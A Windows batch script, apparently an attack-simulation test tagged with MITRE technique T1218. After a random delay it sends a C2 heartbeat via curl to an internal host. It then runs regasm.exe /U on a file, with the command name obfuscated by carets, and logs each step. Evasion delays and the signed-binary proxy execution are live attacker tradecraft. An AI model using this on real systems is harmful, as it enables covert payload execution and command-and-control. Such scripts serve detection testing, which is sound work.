@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\8517\9c4052a0
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8517-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=firelox.txt
SET dvhhyc=8517

REM Log file path using PHR_ value
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log

REM Initial random delay 30-60 seconds
SET /A yzqjxq=%RANDOM% %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_start=!yzqjxq!>> "!logfile!" 2>nul
timeout /t !yzqjxq! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: initial_delay_complete=success>> "!logfile!" 2>nul

REM C2 HEARTBEAT - FIRST OPERATION
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat_start=!keghkgto!>> "!logfile!" 2>nul
curl -k -s -o nul "!keghkgto!"
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat_complete=success>> "!logfile!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: c2_heartbeat_complete=failed>> "!logfile!" 2>nul
)
SET del1=!RANDOM!
SET /A del1=!del1! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: inter_op_delay_start=!del1!>> "!logfile!" 2>nul
ping -n !del1! 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: inter_op_delay_complete=success>> "!logfile!" 2>nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_attempt=!txisnba!>> "!logfile!" 2>nul
cd /d "!txisnba!"
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_complete=success>> "!logfile!" 2>nul
    SET r_es_u_lt=1
    SET e_rrd_et=:
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: directory_change_complete=failed>> "!logfile!" 2>nul
    SET r_es_u_lt=0
    SET e_rrd_et=access_denied
)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution: Regsvcs/Regasm=!r_es_u_lt!!e_rrd_et!>> "!logfile!" 2>nul

SET del2=!RANDOM!
SET /A del2=!del2! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: inter_op_delay_start=!del2!>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T !del2! >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: inter_op_delay_complete=success>> "!logfile!" 2>nul

REM Obfuscated regasm.exe execution with /U flag
SET a1=r^e^g^a^s^m
SET a2=^.^e^x^e
SET b1= ^/^U^ 
SET c1="!xzanpex!"

SET exe_path=%windir%\Microsoft.NET\Framework\v4.0.30319\
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_execution_attempt=!exe_path!>> "!logfile!" 2>nul

CALL "!exe_path!!a1!!a2!" !b1!!c1!
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_execution_complete=success>> "!logfile!" 2>nul
    SET r_es_u_lt_2=1
    SET e_rrd_et_2=:
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_execution_complete=failed>> "!logfile!" 2>nul
    SET r_es_u_lt_2=0
    SET e_rrd_et_2=assembly_load_failed
)
echo [!DATE! !TIME!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution: Regsvcs/Regasm=!r_es_u_lt_2!!e_rrd_et_2!>> "!logfile!" 2>nul

REM Final random delay
SET /A del3=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_start=!del3!>> "!logfile!" 2>nul
timeout /t !del3! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: final_delay_complete=success>> "!logfile!" 2>nul

ENDLOCAL